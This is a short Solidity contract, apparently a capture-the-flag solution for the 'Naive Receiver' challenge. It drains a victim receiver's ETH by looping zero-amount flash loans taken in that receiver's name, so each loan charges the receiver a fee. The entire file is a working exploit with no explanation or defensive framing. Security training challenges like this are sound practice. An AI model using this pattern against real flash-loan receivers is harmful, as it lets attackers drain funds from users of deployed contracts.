// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.0;

import "../naive-receiver/NaiveReceiverLenderPool.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract NaiveReceiverDrainer {
    address internal _naiveReceiver;
    NaiveReceiverLenderPool internal _naiveLendingPool;

    constructor(address _receiver, NaiveReceiverLenderPool _lendingPool) {
        _naiveReceiver = _receiver;
        _naiveLendingPool = _lendingPool;
    }

    function drainNaiveReceiver() external {
        while (_naiveReceiver.balance > 0) {
            _naiveLendingPool.flashLoan(IERC3156FlashBorrower(_naiveReceiver), _naiveLendingPool.ETH(), 0, "");
        }
    }
}
